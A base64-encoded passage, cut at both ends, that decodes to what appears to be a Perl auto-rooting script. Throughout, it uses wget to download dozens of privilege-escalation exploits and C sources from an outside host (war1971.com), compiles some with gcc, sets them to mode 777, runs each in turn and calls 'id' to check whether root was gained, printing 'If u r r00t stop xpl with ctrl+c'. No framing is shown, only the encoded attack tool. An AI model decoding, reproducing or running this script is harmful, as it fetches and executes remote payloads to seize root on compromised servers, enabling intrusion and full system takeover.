L2NjL2V4cDciKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwNyIpOyANCnN5c3RlbSgiLi9leHA3 Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01T X0ZJTEVTL2ZpbGUvY2MvZXhwOCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBleHA4Iik7IA0Kc3lz dGVtKCIuL2V4cDgiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHA5Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4 cDkiKTsgDQpzeXN0ZW0oIi4vZXhwOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5 NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL3J1bjIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVu MiIpOyANCnN5c3RlbSgiLi9ydW4yIik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIg cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvcnVuMiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBydW4y Iik7IA0Kc3lzdGVtKCIuL3J1bjIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciBy MDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcx LmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHBsb2l0Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4 cGxvaXQiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAi SWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDov L3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4cGxvaXQyIik7ICANCnN5c3RlbSgiY2ht b2QgNzc3IGV4cGxvaXQyIik7IA0Kc3lzdGVtKCIuL2V4cGxvaXQyIik7IA0Kc3lzdGVtKCJpZCIp OyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgi d2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwbG9pdDIiKTsgIA0K c3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdDIiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdDIiKTsgDQpz eXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4i Ow0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9ydW4y Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IHJ1bjIiKTsgDQpzeXN0ZW0oIi4vcnVuMiIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzIwMDkt MSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAyMDA5LTEiKTsgDQpzeXN0ZW0oIi4vMjAwOS0xIik7 IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwr Y1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2Mv ZGVybGUuYyIpOyANCnN5c3RlbSgiZ2NjIGRlcmxlLmMgLW8gZGVybGUiKTsgIA0Kc3lzdGVtKCJj aG1vZCA3NzcgZGVybGUiKTsgDQpzeXN0ZW0oIi4vZGVybGUiKTsgDQpzeXN0ZW0oImlkIik7IA0K cHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0 IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8zLmMiKTsgDQpzeXN0ZW0oImdj YyAzLmMgLW8gMyIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAzIik7IA0Kc3lzdGVtKCIuLzMiKTsg DQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtj XG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8z YSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDNhIik7IA0Kc3lzdGVtKCIuLzNhIik7IA0Kc3lzdGVt KCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5 c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNC5jIik7IA0K c3lzdGVtKCJnY2MgNC5jIC1vIDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgNCIpOyANCnN5c3Rl bSgiLi80Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3 aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvNGEiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA0YSIpOyANCnN5c3RlbSgiLi80YSIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy9jeC5jIik7IA0Kc3lzdGVtKCJnY2MgY3guYyAtbyBjeCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3 NyBjeCIpOyANCnN5c3RlbSgiLi9jeCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jeHguYyIpOyANCnN5c3RlbSgiZ2NjIGN4eC5jLSBv IGN4eCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBjeHgiKTsgDQpzeXN0ZW0oIi4vY3h4Iik7IA0K c3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xu IjsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4 cGxvaXQyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdDIiKTsgDQpzeXN0ZW0oIi4vZXhw bG9pdDIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdp dGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBydW4gaHR0cDovL3dhcjE5NzEuY29tL0NNU19G SUxFUy9maWxlL2NjL3J1biIpOyANCnN5c3RlbSgiY2htb2QgNzc3IHJ1biIpOyANCnN5c3RlbSgi Li9ydW4iKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdp dGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvcnVuLnNoIik7ICANCnN5c3RlbSgiY2htb2QgNzc3IHJ1bi5zaCIpOyANCnN5c3Rl bSgiLi9ydW4uc2giKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag eHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf RklMRVMvZmlsZS9jYy8yOS5jIik7IA0Kc3lzdGVtKCJnY2MgMjkuYyAtbyAyOSIpOyAgDQpzeXN0 ZW0oImNobW9kIDc3NyAyOSIpOyANCnN5c3RlbSgiLi8yOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpw cmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oImh0dHA6 Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8zMCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3 NyAzMCIpOyANCnN5c3RlbSgiLi8zMCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5 NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzIwMDkiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAw OSIpOyANCnN5c3RlbSgiLi8yMDA5Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIg cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvaXNrb3JwaXR4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3 IGlza29ycGl0eCIpOyANCnN5c3RlbSgiLi9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImlkIik7IA0K cHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0 IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jIik7ICANCnN5c3RlbSgiY2ht b2QgNzc3IGMiKTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYg dSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dh cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2N4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGN4 Iik7IA0Kc3lzdGVtKCIuL2N4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAw dCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5j b20vQ01TX0ZJTEVTL2ZpbGUvY2MvZGVybGUyIik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGRlcmxl MiIpOyANCnN5c3RlbSgiLi9kZXJsZTIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUg ciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9kZXJsZSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBk ZXJsZSIpOyANCnN5c3RlbSgiLi9kZXJsZSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYg dSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dh cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzZ4LmMiKTsgIA0Kc3lzdGVtKCJnY2MgNnguYyAt byA2eGEiKTsgDQpzeXN0ZW0oIi4vNnhhIik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1 IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2Fy MTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNngiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgNngi KTsgDQpzeXN0ZW0oIi4vNngiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0 IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNv bS9DTVNfRklMRVMvZmlsZS9jYy82YiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA2YiIpOyANCnN5 c3RlbSgiLi82YiIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4 cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19G SUxFUy9maWxlL2NjLzZ4eCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA2eHgiKTsgDQpzeXN0ZW0o Ii4vNnh4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3 aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvMjc3MDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjc3MDQiKTsgDQpzeXN0ZW0o Ii4vMjc3MDQiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBs IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklM RVMvZmlsZS9jYy9kZXJsZTIuYyIpOyANCnN5c3RlbSgiZ2NjIGRlcmxlMi5jIC1vIGRlcmxlMiIp OyAgDQpzeXN0ZW0oImNobW9kIDc3NyBkZXJsZTIiKTsgDQpzeXN0ZW0oIi4vZGVybGUyIik7IA0K c3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xu IjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZGVy bGUyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZGVybGUyIik7IA0Kc3lzdGVtKCIuL2RlcmxlMiIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy8yOC5jIik7IA0Kc3lzdGVtKCJnY2MgMjguYyAtbyAyOCIpOyANCnN5c3RlbSgiY2htb2QgNzc3 IDI4Iik7IA0Kc3lzdGVtKCIuLzI4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yOCIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy8yNy5jIik7IA0Kc3lzdGVtKCJnY2MgMjcuYyAtbyAyNyIpOyANCnN5c3RlbSgiY2htb2QgNzc3 IDI3Iik7IA0Kc3lzdGVtKCIuLzI3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yNyIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy9jLmMiKTsgDQpzeXN0ZW0oImdjYyBjLmMgLW8gYyIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGMi KTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jMi5j Iik7IA0Kc3lzdGVtKCJnY2MgYzIuYyAtbyBjMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGMyIik7 IA0Kc3lzdGVtKCIuL2MyIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9jMiIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8wNSIp OyANCnN5c3RlbSgiY2htb2QgNzc3IDA1Iik7IA0Kc3lzdGVtKCIuLzA1Iik7IA0Kc3lzdGVtKCJp ZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsgDQpzeXN0 ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2lza28iKTsgDQpz eXN0ZW0oImNobW9kIDc3NyBpc2tvIik7IA0Kc3lzdGVtKCIuL2lza28iKTsgDQpzeXN0ZW0oImlk Iik7DQpzeXN0ZW0oIi4vaXNrbyIpOyANCnN5c3RlbSgiaXNrbyIpOw0KcHJpbnQgIklmIHUgciBy MDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMTgiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOyAN CnN5c3RlbSgiLi8xOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vMTgiKTsgDQpzeXN0 ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyAN CnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNyIpOyAN CnN5c3RlbSgiY2htb2QgNzc3IDciKTsgDQpzeXN0ZW0oIi4vNyIpOyANCnN5c3RlbSgiaWQiKTsg DQpzeXN0ZW0oIi4vNyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3Rv cCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9D TVNfRklMRVMvZmlsZS9jYy83LTIiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA3LTIiKTsgDQpzeXN0 ZW0oIi4vNy0yIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi83LTIiKTsgDQpzeXN0ZW0o ImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5 c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOCIpOyANCnN5 c3RlbSgiY2htb2QgNzc3IDgiKTsgDQpzeXN0ZW0oIi4vOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpz eXN0ZW0oIi4vOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4 cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf RklMRVMvZmlsZS9jYy84YSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDhhIik7IA0Kc3lzdGVtKCIu LzhhIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi84YSIpOyANCnN5c3RlbSgiaWQiKTsg DQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3 Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy84YmIiKTsgDQpzeXN0ZW0o ImNobW9kIDc3NyA4YmIiKTsgDQpzeXN0ZW0oIi4vOGJiIik7IA0Kc3lzdGVtKCJpZCIpOyANCnBy aW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsgDQpzeXN0ZW0oIndnZXQg aHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzhjYyIpOyANCnN5c3RlbSgiY2ht b2QgNzc3IDhjYyIpOyANCnN5c3RlbSgiLi84Y2MiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQg IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRw Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOHgiKTsgDQpzeXN0ZW0oImNobW9kIDc3 NyA4eCIpOyANCnN5c3RlbSgiLi84eCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vOHgi KTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3Ry bCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUv Y2MvOSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDkiKTsgDQpzeXN0ZW0oIi4vOSIpOyANCnN5c3Rl bSgiaWQiKTsgDQpzeXN0ZW0oIi4vOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9rcmFkMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGty YWQyIik7IA0Kc3lzdGVtKCIuL2tyYWQyIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9r cmFkMiAtdCAxIC1wIDIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2tyYWQyIC10IDEg LXAgMyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZDIgLXQgMSAtcCA0Iik7IA0K c3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkMiAtdCAxIC1wIDUiKTsgDQpzeXN0ZW0oImlk Iik7IA0Kc3lzdGVtKCIuL2tyYWQyIC10IDEgLXAgNiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0 ZW0oIi4va3JhZDIgLXQgMSAtcCA3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFk MiAtdCAxIC1wIDgiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag eHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01T X0ZJTEVTL2ZpbGUvY2Mva3JhZCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGtyYWQiKTsgDQpzeXN0 ZW0oIi4va3JhZCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZCAtdCAxIC1wIDIi KTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2tyYWQgLXQgMSAtcCAzIik7IA0Kc3lzdGVt KCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkIC10IDEgLXAgNCIpOyANCnN5c3RlbSgiaWQiKTsgDQpz eXN0ZW0oIi4va3JhZCAtdCAxIC1wIDUiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2ty YWQgLXQgMSAtcCA2Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkIC10IDEgLXAg NyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZCAtdCAxIC1wIDgiKTsgDQpzeXN0 ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmls ZS9jYy9rLXJhZDMiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBrLXJhZDMiKTsgDQpzeXN0ZW0oIi4v ay1yYWQzIC10IDEgLXAgMiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10 IDEgLXAgMyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNCIp OyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNSIpOyANCnN5c3Rl bSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNiIpOyANCnN5c3RlbSgiaWQiKTsg DQpzeXN0ZW0oIi4vay1yYWQzIC10LXAgMiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4v ay1yYWQzIC10IC1wIDIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2stcmFkMyAtYSAt cCA3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rLXJhZDMgLWEgLXAgNyIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8yNjgi KTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyNjgiKTsgDQpzeXN0ZW0oIi4vMjY4Iik7IA0KcHJpbnQg IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRw Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMjAwOCIpOyANCnN5c3RlbSgiY2htb2Qg Nzc3IDIwMDgiKTsgDQpzeXN0ZW0oIi4vMjAwOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAi SWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7ICANCnN5c3RlbSgid2dldCBodHRw Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMjAwOXguYyIpOyANCnN5c3RlbSgiZ2Nj IDIwMDl4LmMgLW8gMjAwOXgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOXgiKTsgDQpzeXN0 ZW0oIi4vMjAwOXgiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag eHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf RklMRVMvZmlsZS9jYy8yMDA5eHgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOXh4Iik7IA0K c3lzdGVtKCIuLzIwMDl4eCIpOyANCnN5c3RlbSgiaWQiKTsNCnN5c3RlbSgiaWQiKTsgDQpwcmlu dCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0 dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8yLjYuOS01NS0yMDA3LXBydjgiKTsg DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NS0yMDA3LXBydjgiKTsgDQpzeXN0ZW0oIi4vMi42 LjktNTUtMjAwNy1wcnY4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yLjYuOS01NS0y 